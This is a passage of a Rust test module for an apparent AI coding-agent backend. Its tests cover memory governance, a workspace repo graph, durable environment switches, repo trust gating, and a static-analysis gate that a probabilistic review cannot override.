            "the still-present README citation is not flagged"
        );
        // Durably quarantined: it is no longer context-eligible.
        assert_eq!(
            host.memory_get(&record.memory_id).unwrap().status,
            crate::memory::MemoryStatus::Quarantined
        );
        assert!(host.memory_context(&scope).is_empty());

        // An unknown record target errors rather than silently passing.
        assert!(host
            .memory_revalidate(
                crate::memory::RevalidateTarget::record("mem_does-not-exist"),
                &repo,
            )
            .is_err());

        let _ = std::fs::remove_dir_all(dir);
        let _ = std::fs::remove_dir_all(repo);
    }

    #[tokio::test]
    async fn memory_supersede_replaces_without_erasing_history() {
        let dir = std::env::temp_dir().join(format!("hide_mem_supersede_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let scope = crate::memory::MemoryScope::Repo("proj".to_string());

        let old = host
            .memory_add(crate::memory::MemoryDraft::new(
                scope.clone(),
                "build uses make",
                "docs",
                "user",
            ))
            .unwrap();
        let (old_after, new) = host
            .memory_supersede(
                &old.memory_id,
                crate::memory::MemoryDraft::new(
                    scope.clone(),
                    "build uses cargo",
                    "docs",
                    "user",
                ),
            )
            .unwrap();

        // The old record is Superseded and LINKED to its replacement (both ways).
        assert_eq!(old_after.status, crate::memory::MemoryStatus::Superseded);
        assert_eq!(old_after.superseded_by.as_deref(), Some(new.memory_id.as_str()));
        assert_eq!(new.supersedes.as_deref(), Some(old.memory_id.as_str()));
        assert_eq!(new.status, crate::memory::MemoryStatus::Active);

        // History is PRESERVED: the old record is still durably queryable.
        let reloaded_old = host.memory_get(&old.memory_id).expect("old record kept");
        assert_eq!(reloaded_old.status, crate::memory::MemoryStatus::Superseded);
        assert_eq!(reloaded_old.superseded_by.as_deref(), Some(new.memory_id.as_str()));

        // memory_list keeps BOTH (auditable); only the new one is context-eligible.
        assert_eq!(host.memory_list(&scope).len(), 2);
        let context = host.memory_context(&scope);
        assert_eq!(context.len(), 1);
        assert_eq!(context[0].memory_id, new.memory_id);

        // Durable across a workspace reopen.
        let reopened = BackendHost::open_workspace(&dir).unwrap();
        assert_eq!(reopened.memory_list(&scope).len(), 2);
        assert_eq!(reopened.memory_context(&scope).len(), 1);

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn memory_outcome_governance_raises_on_success_and_quarantines_below_floor() {
        let dir = std::env::temp_dir().join(format!("hide_mem_outcome_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let scope = crate::memory::MemoryScope::User("u".to_string());

        let record = host
            .memory_add(crate::memory::MemoryDraft::new(
                scope.clone(),
                "prefer state over text",
                "conversation",
                "user",
            ))
            .unwrap();
        let start = record.outcome_score;

        // Repeated success raises the governed score + use_count; stays Active.
        host.memory_record_outcome(&record.memory_id, true).unwrap();
        let after_success = host.memory_record_outcome(&record.memory_id, true).unwrap();
        assert!(after_success.outcome_score > start);
        assert_eq!(after_success.use_count, 2);
        assert_eq!(after_success.status, crate::memory::MemoryStatus::Active);

        // Failures lower the score; once below the floor the record quarantines.
        let mut latest = after_success;
        for _ in 0..3 {
            latest = host.memory_record_outcome(&record.memory_id, false).unwrap();
        }
        assert!(latest.outcome_score < crate::memory::QUARANTINE_FLOOR);
        assert_eq!(latest.status, crate::memory::MemoryStatus::Quarantined);

        // Durable + no longer context-eligible.
        assert_eq!(
            host.memory_get(&record.memory_id).unwrap().status,
            crate::memory::MemoryStatus::Quarantined
        );
        assert!(host.memory_context(&scope).is_empty());

        // An unknown id errors.
        assert!(host.memory_record_outcome("mem_missing", true).is_err());

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn memory_list_returns_only_the_requested_scope() {
        let dir = std::env::temp_dir().join(format!("hide_mem_scope_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = crate::memory::MemoryScope::Session("s1".to_string());
        let repo = crate::memory::MemoryScope::Repo("r1".to_string());
        let user = crate::memory::MemoryScope::User("u1".to_string());

        host.memory_add(crate::memory::MemoryDraft::new(
            session.clone(),
            "session claim",
            "src",
            "a",
        ))
        .unwrap();
        host.memory_add(crate::memory::MemoryDraft::new(
            repo.clone(),
            "repo claim",
            "src",
            "a",
        ))
        .unwrap();
        host.memory_add(crate::memory::MemoryDraft::new(
            user.clone(),
            "user claim",
            "src",
            "a",
        ))
        .unwrap();

        // Each scoped list returns ONLY its own scope's records.
        let session_list = host.memory_list(&session);
        assert_eq!(session_list.len(), 1);
        assert_eq!(session_list[0].claim, "session claim");
        assert!(session_list.iter().all(|r| r.scope == session));

        let repo_list = host.memory_list(&repo);
        assert_eq!(repo_list.len(), 1);
        assert_eq!(repo_list[0].claim, "repo claim");

        let user_list = host.memory_list(&user);
        assert_eq!(user_list.len(), 1);
        assert_eq!(user_list[0].claim, "user claim");

        // A scope with the SAME id but a different kind does not cross over.
        let repo_s1 = crate::memory::MemoryScope::Repo("s1".to_string());
        assert!(host.memory_list(&repo_s1).is_empty());

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn workspace_graph_projects_repos_and_typed_edges_deterministically() {
        use crate::services::{RepoNode, WorkspaceEdgeKind};
        let dir = std::env::temp_dir().join(format!("hide_ws_graph_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();

        // Add three repos out of sorted order; the projection must sort them.
        host.workspace_add_repo(RepoNode::new("web", dir.join("web")).with_branch("main"))
            .unwrap();
        host.workspace_add_repo(RepoNode::new("api", dir.join("api")).with_branch("main"))
            .unwrap();
        host.workspace_add_repo(RepoNode::new("docs", dir.join("docs")))
            .unwrap();

        // Typed edges between the repos (added out of order).
        host.workspace_add_edge("web", "api", WorkspaceEdgeKind::ConsumesApiFrom)
            .unwrap();
        host.workspace_add_edge("api", "docs", WorkspaceEdgeKind::Documents)
            .unwrap();
        host.workspace_add_edge("web", "api", WorkspaceEdgeKind::DependsOn)
            .unwrap();

        let graph = host.workspace_graph();

        // Repos: deterministically sorted by id (api, docs, web).
        let repo_ids: Vec<&str> = graph.repos.iter().map(|r| r.repo_id.as_str()).collect();
        assert_eq!(repo_ids, vec!["api", "docs", "web"]);

        // Edges: sorted by (from, kind, to) with the correct typed kinds.
        assert_eq!(graph.edges.len(), 3);
        let edge_tuples: Vec<(&str, &str, WorkspaceEdgeKind)> = graph
            .edges
            .iter()
            .map(|e| (e.from.as_str(), e.to.as_str(), e.kind))
            .collect();
        assert_eq!(
            edge_tuples,
            vec![
                ("api", "docs", WorkspaceEdgeKind::Documents),
                ("web", "api", WorkspaceEdgeKind::ConsumesApiFrom),
                ("web", "api", WorkspaceEdgeKind::DependsOn),
            ]
        );

        // Deterministic across calls (and across a workspace reopen).
        assert_eq!(host.workspace_graph(), graph);
        let reopened = BackendHost::open_workspace(&dir).unwrap();
        assert_eq!(reopened.workspace_graph(), graph);

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn environment_switch_records_durable_event_and_session_continues() {
        use crate::services::EnvironmentNode;
        let dir = std::env::temp_dir().join(format!("hide_ws_env_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        // Two environments in the graph, each with its own fs roots + tool scopes.
        host.workspace_add_environment(
            EnvironmentNode::new("dev")
                .with_fs_roots(vec![dir.join("web")])
                .with_tool_scopes(vec!["fs.read".to_string()]),
        )
        .unwrap();
        host.workspace_add_environment(
            EnvironmentNode::new("ci")
                .with_fs_roots(vec![dir.join("api")])
                .with_tool_scopes(vec!["fs.read".to_string(), "shell.run".to_string()]),
        )
        .unwrap();

        // First switch: previous_env is None; new_env is dev; the record carries
        // the target environment's fs roots + tool scopes and the reason.
        let first = host
            .environment_switch(session.clone(), "dev", "start local work")
            .await
            .unwrap();
        assert_eq!(first.previous_env, None);
        assert_eq!(first.new_env, "dev");
        assert_eq!(first.reason, "start local work");
        assert_eq!(first.tool_scopes, vec!["fs.read".to_string()]);

        // Second switch: previous_env now carries dev; new_env is ci.
        let second = host
            .environment_switch(session.clone(), "ci", "run the suite")
            .await
            .unwrap();
        assert_eq!(second.previous_env.as_deref(), Some("dev"));
        assert_eq!(second.new_env, "ci");
        assert_eq!(second.reason, "run the suite");

        // The switches are DURABLE on the session's OWN log (the thread is not
        // lost): both are readable back, in order, previous/new intact.
        let switches = host.environment_switches(&session).await.unwrap();
        assert_eq!(switches.len(), 2);
        assert_eq!(switches[0].previous_env, None);
        assert_eq!(switches[0].new_env, "dev");
        assert_eq!(switches[1].previous_env.as_deref(), Some("dev"));
        assert_eq!(switches[1].new_env, "ci");

        // The session continues: it is the SAME id and the log still accepts new
        // events after the switch (no fork, no lost thread).
        assert_eq!(host.services.session(), session);
        host.services
            .event_log
            .append(NewEvent::system(
                session.clone(),
                "agent.message",
                json!({ "role": "assistant", "text": "still here" }),
            ))
            .await
            .unwrap();
        let events = host
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap();
        // two environment.switch events + one agent.message.
        assert_eq!(events.len(), 3);
        assert_eq!(
            events
                .iter()
                .filter(|e| e.kind == "environment.switch")
                .count(),
            2
        );

        // Switching into an environment not in the graph is a NotFound, not a
        // silent no-op.
        assert!(host
            .environment_switch(session.clone(), "ghost", "nope")
            .await
            .is_err());

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn untrusted_repo_is_inert_until_trust_is_set() {
        use crate::services::{RepoNode, TrustState};
        let dir = std::env::temp_dir().join(format!("hide_ws_trust_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();

        // A repo added with instructions + policy refs but NO trust decision.
        host.workspace_add_repo(
            RepoNode::new("vendor", dir.join("vendor"))
                .with_instructions_ref("blob:instructions")
                .with_policy_ref("blob:policy"),
        )
        .unwrap();

        // Trust-before-config: while untrusted the refs exist on the record but
        // are INERT (never treated active), so capability grants keyed on them
        // stay off.
        let untrusted = host.workspace_repo("vendor").unwrap();
        assert_eq!(untrusted.trust, TrustState::Untrusted);
        assert!(untrusted.instructions_ref.is_some());
        assert!(untrusted.policy_ref.is_some());
        assert_eq!(untrusted.active_instructions_ref(), None);
        assert_eq!(untrusted.active_policy_ref(), None);

        // Record trust FIRST, then the same refs become active.
        let trusted = host
            .workspace_set_repo_trust("vendor", TrustState::Trusted)
            .unwrap()
            .expect("the repo exists");
        assert_eq!(trusted.trust, TrustState::Trusted);
        assert_eq!(
            trusted.active_instructions_ref(),
            Some("blob:instructions")
        );
        assert_eq!(trusted.active_policy_ref(), Some("blob:policy"));

        // Durable: a reopen recovers the trusted state (and keeps the refs active).
        let reopened = BackendHost::open_workspace(&dir).unwrap();
        let after = reopened.workspace_repo("vendor").unwrap();
        assert_eq!(after.trust, TrustState::Trusted);
        assert_eq!(after.active_instructions_ref(), Some("blob:instructions"));

        // The bare setter still reports "not in the graph" as None rather than inventing a node.
        assert!(reopened
            .workspace_set_repo_trust("ghost", TrustState::Trusted)
            .unwrap()
            .is_none());

        let _ = std::fs::remove_dir_all(dir);
    }

    /// The add-folder flow, whole. `workspace_add_repo` has no wire name, so the trust intent is the
    /// one place a repo enters the graph from the app: it carries the folder's `root_path` and
    /// creates the node before applying the decision. Without that the intent hit a node that was
    /// never there, answered `Ok(None)` with no event and no error, and the control sat pending for
    /// good. With no path there is nothing to create, so it refuses instead of no-opping.
    #[tokio::test]
    async fn the_trust_intent_enters_the_folder_into_the_graph() {
        use crate::services::TrustState;
        let dir = std::env::temp_dir().join(format!("hide_ws_trust_add_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let root = dir.join("vendor");

        host.handle_memory_workspace_env_intent(
            "workspace_set_repo_trust",
            &json!({
                "repo_id": "vendor",
                "root_path": root.to_string_lossy(),
                "trust": "trusted",
            }),
        )
        .await
        .expect("the folder enters the graph and the decision lands on it");
        let repo = host.workspace_repo("vendor").expect("the node was created");
        assert_eq!(repo.trust, TrustState::Trusted);
        assert_eq!(repo.root_path, root);

        // An unknown repo with no path to create it from is an honest refusal, never a silent no-op.
        let err = host
            .handle_memory_workspace_env_intent(
                "workspace_set_repo_trust",
                &json!({ "repo_id": "ghost", "trust": "trusted" }),
            )
            .await
            .unwrap_err();
        assert!(err.to_string().contains("root_path"), "{err}");

        let _ = std::fs::remove_dir_all(dir);
    }

    // --- Deterministic verification plane (bible Book IX sec 28-29, sec 78.1 #6) ---

    /// A source string with three planted deterministic issues: an `.unwrap()`
    /// outside test code, a marker macro, and a function whose body exceeds the
    /// long-function threshold.
    fn dirty_source() -> String {
        let mut src = String::new();
        // 1. unwrap outside test code (Warning) + 2. a marker macro (Error).
        src.push_str("pub fn parse_port(raw: &str) -> u16 {\n");
        src.push_str("    raw.parse::<u16>().unwrap()\n");
        src.push_str("}\n\n");
        src.push_str("pub fn not_done() {\n");
        src.push_str("    todo!()\n");
        src.push_str("}\n\n");
        // 3. a long function: a body well over the 80-line threshold (Warning).
        src.push_str("pub fn sprawling() {\n");
        for i in 0..90 {
            src.push_str(&format!("    let _v{i} = {i};\n"));
        }
        src.push_str("}\n");
        src
    }

    #[tokio::test]
    async fn run_static_analysis_fails_on_planted_issues_and_records_durable_receipt() {
        use hide_verify::CheckKind;

        let dir = std::env::temp_dir().join(format!("hide_verify_dirty_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        let sources = vec![SourceFile::new("src/net.rs", dirty_source())];
        let receipt = host
            .run_static_analysis(session.clone(), sources)
            .await
            .unwrap();

        // Deterministic Tier1 verdict = Fail, oracle = static_analysis, scope set.
        assert!(
            receipt.verdict().is_fail(),
            "planted issues must fail the deterministic gate"
        );
        assert!(!receipt.is_pass());
        assert_eq!(receipt.receipt.tier, VerificationTier::Tier1Deterministic);
        assert_eq!(receipt.receipt.oracle, "static_analysis");
        assert_eq!(
            receipt.receipt.command, None,
            "an in-process oracle runs no command"
        );
        assert_eq!(receipt.receipt.scope, vec!["src/net.rs".to_string()]);
        assert!(!receipt.receipt.source_hash.is_empty());

        // The expected typed findings are all present.
        let kinds: std::collections::HashSet<CheckKind> =
            receipt.findings.iter().map(|f| f.check).collect();
        assert!(
            kinds.contains(&CheckKind::UnwrapOutsideTest),
            "unwrap-outside-test finding expected: {:?}",
            receipt.findings
        );
        assert!(
            kinds.contains(&CheckKind::PanicMarker),
            "marker-macro finding expected"
        );
        assert!(
            kinds.contains(&CheckKind::LongFunction),
            "long-function finding expected"
        );

        // The receipt is durable + readable back via verification_receipts.
        let stored = host.verification_receipts(&session).await.unwrap();
        assert_eq!(stored.len(), 1, "exactly one receipt was recorded");
        assert_eq!(stored[0], receipt, "the stored receipt round-trips exactly");
        assert!(stored[0].verdict().is_fail());

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn run_static_analysis_passes_on_clean_source() {
        let dir = std::env::temp_dir().join(format!("hide_verify_clean_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        let clean = "pub fn add(a: i32, b: i32) -> i32 {\n    a + b\n}\n";
        let receipt = host
            .run_static_analysis(
                session.clone(),
                vec![SourceFile::new("src/math.rs", clean)],
            )
            .await
            .unwrap();

        assert!(receipt.is_pass(), "clean source passes the deterministic gate");
        assert!(
            receipt.findings.is_empty(),
            "a clean source yields no findings: {:?}",
            receipt.findings
        );
        assert_eq!(receipt.findings_summary(), "no findings");

        let stored = host.verification_receipts(&session).await.unwrap();
        assert_eq!(stored.len(), 1);
        assert!(stored[0].is_pass());

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn review_role_profiles_are_data_and_call_no_model() {
        let dir = std::env::temp_dir().join(format!("hide_verify_roles_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();

        // The selector returns DATA profiles (never a Verdict, no model call).
        let profiles = host.review_role_profiles();
        assert_eq!(profiles.len(), 8, "all eight review roles are present");

        let correctness = host.review_role_profile(ReviewRole::Correctness);
        assert_eq!(correctness.role, ReviewRole::Correctness);
        assert!(!correctness.focus.is_empty());
        assert!(!correctness.acceptance.is_empty());
        assert!(correctness.output_schema_ref.starts_with("hide.review."));
        assert!(profiles.iter().any(|p| p.role == ReviewRole::Security));

        // No SubmitTurn / generation ran: the session log stays empty, the
        // observable proof that returning a profile is DEFERRED_MODEL_REQUIRED
        // (it calls no model and emits no event).
        let session = host.services.session();
        let events = host
            .services
            .event_log
            .scan(Some(session), None, None)
            .await
            .unwrap();
        assert!(
            events.is_empty(),
            "review-role profiles perform no model call and emit no events"
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn probabilistic_review_cannot_override_a_failing_deterministic_receipt() {
        let dir = std::env::temp_dir().join(format!("hide_verify_authority_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        // A real Tier1 deterministic FAIL over a scope.
        let receipt = host
            .run_static_analysis(
                session.clone(),
                vec![SourceFile::new("src/net.rs", dirty_source())],
            )
            .await
            .unwrap();
        assert!(receipt.verdict().is_fail());
        let scope = receipt.receipt.scope.clone();

        // A probabilistic (Tier4) review that PASSES for the SAME scope.
        let review = TieredVerdict::new(
            VerificationTier::Tier4Review,
            "correctness",
            hide_verify::Verdict::Pass,
        );

        // THE AUTHORITY RULE: the review Pass can never flip the Tier1 Fail.
        let decision =
            host.reconcile_review_for_scope(&scope, &[receipt.clone()], &[review.clone()]);
        assert!(
            matches!(decision, GateDecision::Reject { .. }),
            "a probabilistic review must never override a deterministic failure: {decision:?}"
        );
        assert!(!hide_verify::probabilistic_can_override_deterministic());

        // Control: over a DISJOINT scope the failing receipt is out of play, so the
        // same review is weighed alone -> Inconclusive (a review alone never Accepts).
        let other = host.reconcile_review_for_scope(
            &["src/unrelated.rs".to_string()],
            &[receipt],
            &[review],
        );
        assert!(
            matches!(other, GateDecision::Inconclusive),
            "with no deterministic pass in scope, a review alone is inconclusive: {other:?}"
        );

        let _ = std::fs::remove_dir_all(dir);
    }
}
